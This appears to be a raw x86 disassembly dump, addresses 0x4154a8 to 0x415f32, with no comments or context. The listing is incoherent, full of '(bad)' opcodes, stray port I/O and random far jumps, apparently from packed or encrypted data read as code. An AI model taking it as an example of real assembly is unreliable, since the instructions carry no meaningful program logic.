  4154a8:	cld    
  4154a9:	sbb    ch,bh
  4154ab:	cmp    BYTE PTR [esp+eiz*4],ah
  4154ae:	fmul   DWORD PTR [edx]
  4154b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154b1:	cwde   
  4154b2:	and    al,BYTE PTR [esi-0x53]
  4154b5:	repz jns 0x4154c3
  4154b8:	mov    esp,0xaf5d11f0
  4154bd:	stc    
  4154be:	jg     0x4154b4
  4154c0:	fld    TBYTE PTR [ebx+0x53]
  4154c3:	mov    ds:0x6e243335,al
  4154c8:	push   esi
  4154c9:	(bad)  
  4154cb:	or     edi,esi
  4154cd:	sahf   
  4154ce:	in     eax,dx
  4154cf:	xchg   edx,eax
  4154d0:	dec    edi
  4154d1:	int3   
  4154d2:	out    dx,eax
  4154d3:	fistp  DWORD PTR [ebx+0x36]
  4154d6:	pop    ebx
  4154d7:	ins    BYTE PTR es:[edi],dx
  4154d8:	and    DWORD PTR [eax+ebp*4+0x73],ebp
  4154dc:	jns    0x415470
  4154de:	mov    eax,0x86d34809
  4154e3:	jae    0x415503
  4154e5:	out    dx,al
  4154e6:	ret    0x7e1
  4154e9:	dec    esi
  4154ea:	es cwde 
  4154ec:	paddw  mm3,QWORD PTR [eax-0x100b590]
  4154f3:	cmp    ecx,DWORD PTR [edi]
  4154f5:	inc    ebx
  4154f6:	stos   BYTE PTR es:[edi],al
  4154f7:	push   ecx
  4154f8:	adc    BYTE PTR [edi-0x7a],dh
  4154fb:	jge    0x415551
  4154fd:	jecxz  0x41556d
  4154ff:	(bad)  
  415500:	jns    0x415531
  415502:	sub    BYTE PTR [esp+esi*4],al
  415505:	inc    ecx
  415506:	jge    0x415577
  415508:	inc    esp
  415509:	xlat   BYTE PTR ds:[ebx]
  41550a:	and    al,BYTE PTR [ebx+0x48]
  41550d:	jnp    0x4154fd
  41550f:	push   es
  415510:	and    al,0x8d
  415512:	dec    ebx
  415513:	push   ss
  415514:	sub    eax,edx
  415516:	jmp    0x41556c
  415518:	jns    0x4154f3
  41551a:	lods   eax,DWORD PTR ds:[esi]
  41551b:	add    DWORD PTR [ebx+0x31b27c0f],ebx
  415521:	xchg   edi,eax
  415522:	in     eax,0x3f
  415524:	shl    ecx,0x11
  415527:	fstp   TBYTE PTR [eax-0x45fa80d4]
  41552d:	xchg   ecx,eax
  41552e:	loope  0x415549
  415530:	out    dx,al
  415531:	mov    dl,BYTE PTR [eax-0x1281d027]
  415537:	lds    esp,FWORD PTR [ebx+esi*2]
  41553a:	idiv   DWORD PTR [eax+ecx*2-0x69]
  41553e:	jns    0x4154fd
  415540:	pushf  
  415541:	lods   al,BYTE PTR ds:[esi]
  415542:	shl    bl,1
  415544:	stc    
  415545:	shr    BYTE PTR [edi+0x68],0x98
  415549:	mov    ds:0xd075d65c,eax
  41554e:	or     ebx,DWORD PTR [edi]
  415550:	aam    0xfa
  415552:	cmp    al,BYTE PTR ds:0xa726d1ab
  415558:	je     0x415591
  41555a:	ins    BYTE PTR es:[edi],dx
  41555b:	retf   0x9bb3
  41555e:	pop    ebp
  41555f:	adc    eax,DWORD PTR [edi+0x52]
  415562:	xor    DWORD PTR [ebp+0x44],ebx
  415565:	sbb    BYTE PTR [esi],0xec
  415568:	xor    eax,DWORD PTR [ecx+ecx*8]
  41556b:	ja     0x415561
	...
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x415622
  4155e3:	out    0x5d,al
  4155e5:	jge    0x41563f
  4155e7:	out    0x0,al
  4155e9:	add    bh,bh
  4155eb:	add    BYTE PTR [eax],al
  4155ed:	add    BYTE PTR [ebp+0x71],ah
  4155f0:	push   esi
  4155f1:	and    dh,cl
  4155f3:	push   cs
  4155f4:	fstp   QWORD PTR [ebx]
  4155f6:	out    dx,al
  4155f7:	and    eax,0x7df30a5c
  4155fc:	stos   DWORD PTR es:[edi],eax
  4155fd:	cdq    
  4155fe:	push   ebx
  4155ff:	adc    BYTE PTR [ebp-0x2717f612],bh
  415605:	push   ebp
  415606:	inc    edi
  415607:	push   ds
  415608:	jae    0x4155c2
  41560a:	imul   ebx,DWORD PTR [ebx],0x8e13d0a
  415610:	mov    esi,0x9975a4b9
  415615:	retf   
  415616:	add    ecx,DWORD PTR [eax]
  415618:	inc    bl
  41561a:	aam    0xaa
  41561c:	cmp    esi,ebx
  41561e:	aas    
  41561f:	pop    es
  415620:	test   DWORD PTR [esp+esi*4+0x4adbd20a],edi
  415627:	cdq    
  415628:	xor    ah,al
  41562a:	das    
  41562b:	adc    DWORD PTR [ebp-0x1b],ebp
  41562e:	retf   
  41562f:	xchg   edi,eax
  415630:	shl    DWORD PTR [ecx],0x5
  415633:	mov    DWORD PTR [edx],edx
  415635:	adc    BYTE PTR [eax-0x224500fa],dh
  41563b:	out    0x7d,eax
  41563d:	push   cs
  41563e:	or     eax,0x494204ba
  415643:	lods   al,BYTE PTR ds:[esi]
  415644:	and    eax,0x2098cfe1
  415649:	pop    ecx
  41564a:	leave  
  41564b:	cmc    
  41564c:	sub    BYTE PTR [esi+0x6],cl
  41564f:	push   esp
  415650:	lock shl DWORD PTR [ebx],cl
  415653:	push   0x25d03194
  415658:	cs jbe 0x415642
  41565b:	jb     0x4156c1
  41565d:	sbb    edx,DWORD PTR [edx+edi*2+0x294b4bea]
  415664:	add    BYTE PTR [eax+eiz*4],ah
  415667:	add    ebp,DWORD PTR [ecx]
  415669:	retf   0x4abb
  41566c:	and    edi,esi
  41566e:	ror    BYTE PTR [edi+0x1e],0x7f
  415672:	sbb    ebx,DWORD PTR [ebx]
  415674:	add    DWORD PTR [eax-0x51],esp
  415677:	shr    DWORD PTR gs:[ecx-0x41],cl
  41567b:	icebp  
  41567c:	push   ecx
  41567d:	out    dx,eax
  41567e:	jne    0x415621
  415680:	fistp  WORD PTR [edi-0x7ce65809]
  415686:	xchg   esp,eax
  415687:	and    DWORD PTR [edi],eax
  415689:	dec    esp
  41568a:	inc    edi
  41568b:	cdq    
  41568c:	or     eax,0x36bb488f
  415691:	loope  0x4156d1
  415693:	mov    al,0x85
  415695:	push   0x7def13a7
  41569a:	enter  0x8fd7,0xcc
  41569e:	(bad)  
  4156a0:	leave  
  4156a1:	push   0x50
  4156a3:	inc    ecx
  4156a4:	mov    ecx,0x18164d5c
  4156a9:	scas   al,BYTE PTR es:[edi]
  4156aa:	jae    0x41565c
  4156ac:	cs pop edi
  4156ae:	(bad)  
  4156b0:	jb     0x41565b
  4156b2:	mul    DWORD PTR [esp+eax*1]
  4156b5:	or     DWORD PTR [edx+0x69ebc05f],edx
  4156bb:	mov    ebx,0x8ae27482
  4156c0:	jp     0x415738
  4156c2:	mov    eax,0x304ed4ba
  4156c7:	retf   
  4156c8:	dec    ecx
  4156c9:	int    0xd2
  4156cb:	ror    DWORD PTR [edx+eiz*4],0xe0
  4156cf:	(bad)  
  4156d0:	cli    
  4156d1:	popf   
  4156d2:	sti    
  4156d3:	ret    
  4156d4:	push   0xa299c3af
  4156d9:	cwde   
  4156da:	js     0x415697
  4156dc:	mov    cl,0x16
  4156de:	stos   DWORD PTR es:[edi],eax
  4156df:	mov    bl,0x39
  4156e1:	push   ds
  4156e2:	adc    DWORD PTR [edx],ebx
  4156e4:	xchg   ebx,eax
  4156e5:	daa    
  4156e6:	(bad)  
  4156e7:	add    ebx,DWORD PTR [eax]
  4156e9:	in     eax,0xe8
  4156eb:	dec    ebp
  4156ec:	sub    al,0x0
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0xab
  415763:	dec    eax
  415764:	ss loope 0x4157be
  415767:	out    0x0,eax
  415769:	add    bh,bh
  41576b:	add    BYTE PTR [eax],al
  41576d:	add    BYTE PTR ds:0xd0fc5b0b,dl
  415773:	and    BYTE PTR [edx-0x393dfa59],0x6d
  41577a:	sbb    al,0x99
  41577c:	mov    ah,0xc8
  41577e:	loop   0x41575c
  415780:	xor    al,0x4c
  415782:	lds    eax,FWORD PTR [ecx]
  415784:	push   esp
  415785:	fldcw  WORD PTR [ecx-0x52c61be4]
  41578b:	or     esi,esp
  41578d:	inc    edi
  41578e:	cmp    bl,BYTE PTR [edi-0x3a34d9cf]
  415794:	push   edi
  415795:	imul   esp,DWORD PTR [eax-0x41],0x69
  415799:	sub    DWORD PTR [esi+ebp*1-0x29db1df5],ebp
  4157a0:	cmp    BYTE PTR [ecx+edx*8-0x72],cl
  4157a4:	sbb    edx,DWORD PTR gs:[eax-0x6bdad10]
  4157ab:	jne    0x41581c
  4157ad:	ror    DWORD PTR ds:0x3a4a4ea6,cl
  4157b3:	pop    es
  4157b4:	push   ebx
  4157b5:	gs loopne 0x415820
  4157b8:	jmp    FWORD PTR [ebx+0x10]
  4157bb:	imul   esi,DWORD PTR [edx],0x138c0b68
  4157c1:	test   al,0x4d
  4157c3:	pop    ss
  4157c4:	(bad)  
  4157c5:	out    dx,eax
  4157c6:	cmp    DWORD PTR [eax-0x4f],ebp
  4157c9:	(bad)  
  4157ca:	shl    BYTE PTR ds:0xc4bbcd81,1
  4157d0:	inc    edi
  4157d1:	jns    0x415797
  4157d3:	(bad)  
  4157d4:	cmp    al,0x5a
  4157d6:	dec    edx
  4157d7:	addr16 loop 0x41583b
  4157da:	mov    eax,ds:0x9508310e
  4157df:	xchg   ebp,eax
  4157e0:	xchg   ebp,eax
  4157e1:	fmul   QWORD PTR ds:0x483df613
  4157e7:	xor    eax,0x6d2cfd20
  4157ec:	add    al,0x52
  4157ee:	push   edi
  4157ef:	lods   eax,DWORD PTR ds:[esi]
  4157f0:	jbe    0x415793
  4157f2:	mov    ds:0xb5bbe92e,al
  4157f7:	xor    BYTE PTR ds:0xfbba06e7,0x31
  4157fe:	sbb    eax,0xa6f91ea4
  415803:	mov    dl,0xa2
  415805:	mov    ds,WORD PTR [edi]
  415807:	mov    edi,0x1e5a1e9e
  41580c:	sbb    al,0x76
  41580e:	xor    eax,0x9498d964
  415813:	mov    ah,0x77
  415815:	fxtract 
  415817:	and    al,0x40
  415819:	adc    DWORD PTR [ebx+eax*8],0xdd6cb45e
  415820:	sub    eax,0x62e5d177
  415825:	mov    dl,0x83
  415827:	sub    BYTE PTR [edi-0x323c6604],ch
  41582d:	sbb    al,0x62
  41582f:	std    
  415830:	xchg   esp,eax
  415831:	in     al,0x69
  415833:	adc    DWORD PTR ss:[ebx-0x4e],esp
  415837:	icebp  
  415838:	sbb    al,0xe0
  41583a:	ins    DWORD PTR es:[edi],dx
  41583b:	add    ch,BYTE PTR [ecx+0x31]
  41583e:	mov    esp,0x9fa43b85
  415843:	mov    bl,0xab
  415845:	lods   eax,DWORD PTR ds:[esi]
  415846:	add    al,0xd2
  415848:	mov    ecx,0xaac8ba02
  41584d:	dec    edi
  41584e:	mov    esp,0x81af2eb9
  415853:	sti    
  415854:	int3   
  415855:	imul   DWORD PTR [eax]
  415857:	mov    dh,0x67
  415859:	scas   eax,DWORD PTR es:[edi]
  41585a:	ds jg  0x4158d7
  41585d:	nop
  41585e:	push   es
  41585f:	rol    DWORD PTR [esi-0x4c],0x7e
  415863:	add    edi,DWORD PTR [edx+0x3bffab87]
  415869:	dec    ebp
  41586a:	inc    edx
  41586b:	or     edi,DWORD PTR [ebp+0x0]
	...
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	rcr    DWORD PTR ds:0x568f6f3a,cl
  4158e7:	call   0x14058ec
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	ror    ah,0xd2
  4158f1:	xor    edi,DWORD PTR [ebx-0xa]
  4158f4:	cmp    BYTE PTR [eax-0x14],0xde
  4158f8:	cwde   
  4158f9:	pop    es
  4158fa:	push   ds
  4158fb:	mul    dh
  4158fd:	and    eax,0x2fb94f2f
  415902:	gs mov dh,0x0
  415905:	rol    BYTE PTR [eax],0x3e
  415908:	add    BYTE PTR [esi+0x1a3a8e2],dl
  41590e:	inc    eax
  41590f:	adc    cl,bh
  415911:	and    DWORD PTR [eax+0x69c6544],edi
  415917:	jg     0x41592b
  415919:	scas   al,BYTE PTR es:[edi]
  41591a:	mov    ds:0xfb9288d4,al
  41591f:	xor    BYTE PTR [esi+0x5a],0xf4
  415923:	loope  0x415938
  415925:	jp     0x415956
  415927:	mov    ch,0x28
  415929:	scas   al,BYTE PTR es:[edi]
  41592a:	fs sahf 
  41592c:	pop    eax
  41592d:	popa   
  41592e:	stos   BYTE PTR es:[edi],al
  41592f:	arpl   WORD PTR [ecx],bx
  415931:	inc    ebx
  415932:	call   0xe74c:0xd38fefbe
  415939:	sbb    cl,BYTE PTR [esi]
  41593b:	mov    DWORD PTR [ecx+0x54],0xe940f875
  415942:	mov    cs,WORD PTR ds:0xa2838e8d
  415948:	mov    eax,ds:0xa2b03688
  41594d:	xor    DWORD PTR [esi],esi
  41594f:	cdq    
  415950:	gs push cs
  415952:	outs   dx,DWORD PTR ds:[esi]
  415953:	fcom   QWORD PTR [ebx]
  415955:	dec    edx
  415956:	popa   
  415957:	(bad)  
  415959:	and    bl,0x54
  41595c:	retf   0x4c64
  41595f:	std    
  415960:	(bad)  
  415962:	xchg   edi,eax
  415963:	js     0x4158f1
  415965:	rcr    ah,1
  415967:	shl    dh,cl
  415969:	pop    ss
  41596a:	jno    0x4159b2
  41596c:	xor    esp,ebx
  41596e:	lods   eax,DWORD PTR ds:[esi]
  41596f:	in     al,dx
  415970:	cwde   
  415971:	lahf   
  415972:	fdivp  st(1),st
  415974:	mov    dh,0xe8
  415976:	test   eax,0xc85be9eb
  41597b:	pushf  
  41597c:	stc    
  41597d:	sbb    esp,DWORD PTR [ebx+0x1e050ed8]
  415983:	test   BYTE PTR [ebx+esi*1],ch
  415986:	sbb    esi,esp
  415988:	cwde   
  415989:	xchg   ecx,eax
  41598a:	xor    BYTE PTR [eax-0x182f5b39],ch
  415990:	leave  
  415991:	or     BYTE PTR [ebp+0x67670fc2],al
  415997:	push   edx
  415998:	inc    ecx
  415999:	call   0x878d:0x8585cdb
  4159a0:	sub    DWORD PTR [ecx],ebx
  4159a2:	jle    0x41598d
  4159a4:	aam    0x8e
  4159a6:	xchg   edi,eax
  4159a7:	mov    bl,0x89
  4159a9:	leave  
  4159aa:	aam    0x64
  4159ac:	push   es
  4159ad:	add    al,0xa0
  4159af:	inc    esp
  4159b0:	jmp    0x4159a6
  4159b2:	rcl    cl,cl
  4159b4:	mov    ecx,0x9f5f90d5
  4159b9:	daa    
  4159ba:	je     0x415a05
  4159bc:	loop   0x415a01
  4159be:	xor    BYTE PTR [ecx],al
  4159c0:	sbb    al,0x3
  4159c2:	mov    edx,0xb6322c66
  4159c7:	push   ds
  4159c8:	xchg   bl,bl
  4159ca:	loopne 0x4159e4
  4159cc:	jmp    0xcf862b43
  4159d1:	push   edx
  4159d2:	xchg   BYTE PTR [eax-0xe7c51dc],ah
  4159d8:	or     ebx,ebx
  4159da:	jo     0x4159c4
  4159dc:	icebp  
  4159dd:	sbb    BYTE PTR [ebx-0x6],bl
  4159e0:	xor    ch,BYTE PTR [eax+0x747e6c01]
  4159e6:	fwait
  4159e7:	dec    ecx
  4159e8:	idiv   eax
  4159ea:	inc    edi
  4159eb:	push   cs
  4159ec:	pop    eax
	...
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	push   esp
  415a63:	inc    ecx
  415a64:	mov    al,ds:0xe955ea
  415a69:	add    bh,bh
  415a6b:	add    BYTE PTR [eax],al
  415a6d:	add    BYTE PTR [edi+0x52],bh
  415a70:	xlat   BYTE PTR ds:[ebx]
  415a71:	and    ah,0x9c
  415a74:	push   ebp
  415a75:	(bad)  
  415a77:	outs   dx,BYTE PTR ds:[esi]
  415a78:	xchg   esi,eax
  415a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a7a:	xor    eax,0x539c01ff
  415a7f:	fucomp st(0)
  415a81:	jmp    0x2b399321
  415a86:	and    ch,BYTE PTR [edi-0x26]
  415a89:	pop    ebx
  415a8a:	inc    ecx
  415a8b:	inc    esi
  415a8c:	les    esp,FWORD PTR [ebx-0x3f]
  415a8f:	jecxz  0x415a83
  415a91:	xor    eax,0x93dfbca
  415a96:	test   DWORD PTR [edi+0x2eebf499],0x1054efa7
  415aa0:	popw   ss
  415aa2:	stos   BYTE PTR es:[edi],al
  415aa3:	test   eax,0xd4219d82
  415aa8:	mov    ds:0xebf182d4,al
  415aad:	xchg   BYTE PTR [eax+0x3e],ch
  415ab0:	mov    ah,0xd1
  415ab2:	daa    
  415ab3:	cwde   
  415ab4:	in     al,0x7f
  415ab6:	into   
  415ab7:	adc    dh,BYTE PTR [edx+0x3b]
  415aba:	add    esi,ebp
  415abc:	dec    ecx
  415abd:	xlat   BYTE PTR ds:[ebx]
  415abe:	in     eax,dx
  415abf:	or     bl,bh
  415ac1:	ja     0x415a91
  415ac3:	das    
  415ac4:	mov    cs,WORD PTR [edx+0x69]
  415ac7:	push   esp
  415ac8:	aam    0x9a
  415aca:	jg     0x415b2f
  415acc:	push   ds
  415acd:	dec    ebx
  415ace:	or     al,0xa8
  415ad0:	adc    cl,BYTE PTR [edx-0xd8ff41f]
  415ad6:	arpl   WORD PTR [esi+ecx*2+0x77],sp
  415ada:	adc    bh,BYTE PTR [edi-0x29a4e2d7]
  415ae0:	or     DWORD PTR [ebx+edi*2+0x4a44c3dc],edx
  415ae7:	sahf   
  415ae8:	push   ebp
  415ae9:	fsub   DWORD PTR [eax+0x205e0a10]
  415aef:	sub    esp,eax
  415af1:	repnz aas 
  415af3:	daa    
  415af4:	cdq    
  415af5:	jmp    0x415aec
  415af7:	mov    bl,0x1b
  415af9:	dec    ebp
  415afa:	and    BYTE PTR [ebx+0x63],dl
  415afd:	retf   0x464b
  415b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b01:	mov    al,0x98
  415b03:	adc    esi,DWORD PTR [ebx+0x40]
  415b06:	scas   al,BYTE PTR es:[edi]
  415b07:	or     DWORD PTR [edi],esp
  415b09:	enter  0x8000,0xdd
  415b0d:	sbb    ecx,DWORD PTR [eax-0x476c2f36]
  415b13:	cmp    BYTE PTR [ebx],al
  415b15:	enter  0xaed2,0x1a
  415b19:	(bad)  
  415b1a:	imul   ecx,DWORD PTR [ecx-0x2d],0xe4d3a837
  415b21:	dec    edi
  415b22:	xor    eax,0x16a080c4
  415b27:	xchg   esp,eax
  415b28:	cld    
  415b29:	add    bh,al
  415b2b:	sub    cl,BYTE PTR ds:0x5948d4ae
  415b31:	test   DWORD PTR [ecx],eax
  415b33:	in     al,dx
  415b34:	fisttp WORD PTR [edi-0x1256f054]
  415b3a:	repnz xor DWORD PTR [ecx+0x4927ae02],0x7f610bd5
  415b45:	daa    
  415b46:	(bad)  
  415b48:	mov    DWORD PTR [esi],esp
  415b4a:	js     0x415ba6
  415b4c:	fsubr  st(4),st
  415b4e:	mov    al,ds:0x486706af
  415b53:	sub    BYTE PTR [ebx+0x6d],0xf
  415b57:	(bad)  
  415b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b5a:	in     eax,dx
  415b5b:	jae    0x415b31
  415b5d:	ja     0x415b6e
  415b5f:	pop    ds
  415b60:	repnz xor DWORD PTR [ecx+eax*8+0x28],eax
  415b65:	xchg   ebx,eax
  415b66:	in     al,0x54
  415b68:	xor    BYTE PTR [ebp+esi*1+0xce38],bh
	...
  415bd3:	add    BYTE PTR [eax],al
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fcomp  QWORD PTR [ecx+0x548a69aa]
  415be7:	jmp    0x0:0xff0000
  415bee:	pushw  0x19
  415bf1:	add    ecx,DWORD PTR [edi+0x3]
  415bf4:	ins    BYTE PTR es:[edi],dx
  415bf5:	sbb    al,bh
  415bf7:	jge    0x415bc1
  415bf9:	aad    0xb6
  415bfb:	lock add bh,BYTE PTR [eax+esi*2-0xc68b3e0]
  415c03:	loope  0x415bc9
  415c05:	push   esi
  415c06:	mov    dh,0x85
  415c08:	sub    eax,ecx
  415c0a:	sub    eax,0x98c75459
  415c0f:	adc    edi,DWORD PTR [eax]
  415c11:	jmp    0xbd48:0x62da5f6b
  415c18:	mov    ebx,0xd9178529
  415c1d:	mov    al,BYTE PTR [ebx]
  415c1f:	and    al,BYTE PTR [esi+ecx*2-0x17]
  415c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c24:	pushf  
  415c25:	cli    
  415c26:	(bad)  
  415c27:	mov    esi,0xc17acfba
  415c2c:	cld    
  415c2d:	pop    ss
  415c2e:	sahf   
  415c2f:	jl     0x415bcf
  415c31:	aad    0x4c
  415c33:	les    ebx,FWORD PTR [eax-0x7436ff8b]
  415c39:	popf   
  415c3a:	in     eax,dx
  415c3b:	jg     0x415c60
  415c3d:	jns    0x415c49
  415c3f:	stos   BYTE PTR es:[edi],al
  415c40:	hlt    
  415c41:	xlat   BYTE PTR ds:[ebx]
  415c42:	add    DWORD PTR [eax-0x6b],edx
  415c45:	in     al,dx
  415c46:	mov    ebx,0x1fdfa049
  415c4b:	xor    al,0x76
  415c4d:	jp     0x415bff
  415c4f:	inc    esp
  415c50:	add    dh,BYTE PTR [ebx]
  415c52:	add    DWORD PTR [ebx+0x16],edx
  415c55:	jb     0x415c9a
  415c57:	das    
  415c58:	test   BYTE PTR [eax-0x18],0xf7
  415c5c:	in     eax,dx
  415c5d:	les    ebp,FWORD PTR [esi]
  415c5f:	inc    ecx
  415c60:	push   0x608b2f88
  415c65:	iret   
  415c66:	sub    BYTE PTR [edi],bh
  415c68:	div    DWORD PTR [esp+esi*8]
  415c6b:	mov    eax,0xd5a3781c
  415c70:	pop    ebx
  415c71:	mov    al,ds:0x98aac091
  415c76:	or     ah,dh
  415c78:	jns    0x415c9b
  415c7a:	sub    DWORD PTR [edx-0x1b360952],esp
  415c80:	cld    
  415c81:	push   ss
  415c82:	nop
  415c83:	mov    eax,ds:0x92ea3e90
  415c88:	mov    eax,0x54ffc88a
  415c8d:	dec    ebx
  415c8e:	or     al,0x8b
  415c90:	out    dx,eax
  415c91:	popa   
  415c92:	and    DWORD PTR [esi+0x11],0xffffffce
  415c96:	jge    0x415c3d
  415c98:	push   esp
  415c99:	or     eax,0x1b9cb8a1
  415c9e:	mov    eax,DWORD PTR [edx-0x2ecfd601]
  415ca4:	push   cs
  415ca5:	sbb    bh,BYTE PTR [edi]
  415ca7:	icebp  
  415ca8:	pushf  
  415ca9:	push   0x34
  415cab:	push   edx
  415cac:	dec    ecx
  415cad:	ja     0x415cd9
  415caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb0:	xchg   ebp,eax
  415cb1:	hlt    
  415cb2:	sbb    al,0xf4
  415cb4:	ror    ebx,cl
  415cb6:	out    dx,eax
  415cb7:	ret    
  415cb8:	mov    edx,0x4536e99a
  415cbd:	fwait
  415cbe:	ds ins DWORD PTR es:[edi],dx
  415cc0:	arpl   WORD PTR [ebp+0x58206331],di
  415cc6:	fld    QWORD PTR ds:0x1abcd4fa
  415ccc:	das    
  415ccd:	pop    ebp
  415cce:	sub    edx,DWORD PTR [edi]
  415cd0:	je     0x415d01
  415cd2:	adc    BYTE PTR [eax-0x778a67cb],ah
  415cd8:	loop   0x415cfa
  415cda:	ret    
  415cdb:	(bad)  
  415cdc:	sub    al,0xc7
  415cde:	cwde   
  415cdf:	xchg   edx,eax
  415ce0:	push   0x6141ef21
  415ce5:	pop    edi
  415ce6:	and    bl,BYTE PTR [ecx-0x623c6a41]
  415cec:	loopne 0x415cee
	...
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x346d591f
  415d65:	loope  0x415dba
  415d67:	jmp    0x415d69
  415d69:	add    bh,bh
  415d6b:	add    BYTE PTR [eax],al
  415d6d:	add    BYTE PTR [ebp+eax*1-0x1b],ch
  415d71:	push   cs
  415d72:	jle    0x415d5d
  415d74:	(bad)  
  415d75:	mul    cl
  415d77:	not    BYTE PTR [ebp+0x15]
  415d7a:	lahf   
  415d7b:	jge    0x415d88
  415d7d:	xchg   edx,eax
  415d7e:	scas   al,BYTE PTR es:[edi]
  415d7f:	or     esi,DWORD PTR [edi-0x2504b8c6]
  415d85:	cmc    
  415d86:	mov    edx,0x7f2d02f3
  415d8b:	(bad)  
  415d8d:	and    dh,BYTE PTR [esi+esi*8]
  415d90:	cmp    eax,0xb9f6e2df
  415d95:	jecxz  0x415d3d
  415d97:	retf   0x8c77
  415d9a:	cmp    ch,ah
  415d9c:	int3   
  415d9d:	fst    QWORD PTR [esp+ecx*8]
  415da0:	cmc    
  415da1:	mov    ebx,0x648a23ca
  415da6:	rol    DWORD PTR [eax],1
  415da8:	ja     0x415dc1
  415daa:	sub    al,0xb
  415dac:	or     eax,0x29525376
  415db1:	adc    BYTE PTR [ebx+0x608c62dd],0xa8
  415db8:	ins    BYTE PTR es:[edi],dx
  415db9:	jno    0x415dc2
  415dbb:	mov    al,0xdb
  415dbd:	push   ebx
  415dbe:	mov    al,0xd
  415dc0:	mov    ds:0xdcee6501,eax
  415dc5:	rcl    DWORD PTR [edx],0xa8
  415dc8:	mov    DWORD PTR [ebx-0x62],edi
  415dcb:	mov    dl,0xc7
  415dcd:	popf   
  415dce:	(bad)  
  415dd0:	jne    0x415e0a
  415dd2:	js     0x415d90
  415dd4:	lock sbb DWORD PTR [esi-0x352c81e9],edi
  415ddb:	xchg   edi,eax
  415ddc:	test   al,0x6
  415dde:	outs   dx,BYTE PTR ds:[esi]
  415ddf:	stc    
  415de0:	cs or  eax,edi
  415de3:	aaa    
  415de4:	mov    eax,ds:0xe3ad8449
  415de9:	mov    al,ds:0x5b14f8df
  415dee:	cmp    al,0x67
  415df0:	mov    edi,cs
  415df2:	popa   
  415df3:	jb     0x415e5b
  415df5:	fwait
  415df6:	sbb    ah,BYTE PTR [esi-0xfc9216e]
  415dfc:	cs cdq 
  415dfe:	mov    ah,0x1b
  415e00:	fistp  QWORD PTR [ecx-0x36]
  415e03:	hlt    
  415e04:	adc    DWORD PTR [ebx+0x102124b1],edx
  415e0a:	loopne 0x415e62
  415e0c:	and    BYTE PTR [edi-0x52],cl
  415e0f:	mov    dl,0xb7
  415e11:	stc    
  415e12:	jbe    0x415e75
  415e14:	pop    ds
  415e15:	mov    al,0xcd
  415e17:	push   0x48
  415e19:	(bad)  
  415e1a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e1c:	test   DWORD PTR [esi+0x77],esi
  415e1f:	xchg   ebp,eax
  415e20:	mov    eax,DWORD PTR [eax-0x4b2b90b0]
  415e26:	icebp  
  415e27:	mov    eax,ds:0x555e18d5
  415e2c:	ins    BYTE PTR es:[edi],dx
  415e2d:	mov    al,ds:0xaa6519a9
  415e32:	loop   0x415e71
  415e34:	xchg   edi,eax
  415e35:	push   ebx
  415e36:	mov    ebx,0x558fef61
  415e3b:	sub    DWORD PTR [ebp+0x282f1a78],esp
  415e41:	inc    edx
  415e42:	lea    ecx,[ecx+0x35b95a61]
  415e48:	xchg   esp,eax
  415e49:	fild   QWORD PTR [ebx-0x3b]
  415e4c:	(bad)  
  415e4e:	les    ebx,FWORD PTR [eax]
  415e50:	fild   WORD PTR [esi+0x2a]
  415e53:	jecxz  0x415e6e
  415e55:	dec    ebx
  415e56:	ret    0xac56
  415e59:	add    eax,0x530468d1
  415e5e:	xchg   ebx,eax
  415e5f:	lea    esi,[edi-0x18db2d02]
  415e65:	out    0x68,eax
  415e67:	retf   0xf015
  415e6a:	mov    ebp,0x4c0f
	...
  415ed3:	add    BYTE PTR [eax],al
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x37]
  415ee3:	sub    al,0x2e
  415ee5:	rcl    DWORD PTR [edx-0x14],0x0
  415ee9:	add    bh,bh
  415eeb:	add    BYTE PTR [eax],al
  415eed:	add    BYTE PTR [esi+0x1792e9cc],ch
  415ef3:	jae    0x415f03
  415ef5:	rol    BYTE PTR [esi],1
  415ef7:	repz mov esi,0x48d4a5dc
  415efd:	inc    ebp
  415efe:	xor    al,0xd5
  415f00:	loope  0x415f00
  415f02:	mov    BYTE PTR [esi+0xf],0x29
  415f06:	jo     0x415f63
  415f08:	aam    0xa7
  415f0a:	mov    ebx,0x127d4bc6
  415f0f:	mov    esp,0x713549b0
  415f14:	jl     0x415f0b
  415f16:	scas   al,BYTE PTR es:[edi]
  415f17:	add    esp,DWORD PTR [ebx]
  415f19:	es mov esi,0x5e62fa9b
  415f1f:	jg     0x415ef0
  415f21:	xchg   DWORD PTR [edi-0x53f55c50],esi
  415f27:	mov    ebp,0xf7f70625
  415f2c:	daa    
  415f2d:	adc    eax,0x6818fe62
  415f32:	xor    BYTE PTR [eax-0x64],0x94
